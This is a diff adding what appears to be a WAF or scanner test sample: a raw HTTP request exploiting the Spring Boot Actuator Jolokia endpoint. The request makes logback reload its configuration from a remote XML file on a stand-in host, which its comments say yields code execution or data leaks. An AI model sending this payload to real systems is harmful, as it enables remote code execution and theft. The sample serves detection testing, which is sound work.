@@ -1,0 +1,9 @@
+# 利用Spring Boot Actuators xml外部实体注入漏洞执行代码
+# 利用利用Spring Boot Actuators xml外部实体注入漏洞执行任意代码和/或泄露目标机器的敏感信息。
+GET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml?acid=80000125&bid=hd_tag_m8mv26bp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26bp
+RM-PRO-Token: 016159ab02372d4c1b3e7c93eb88d96e
+RM-PRO-Time: 1742808575033
+User-Agent: curl/7.83.1
+
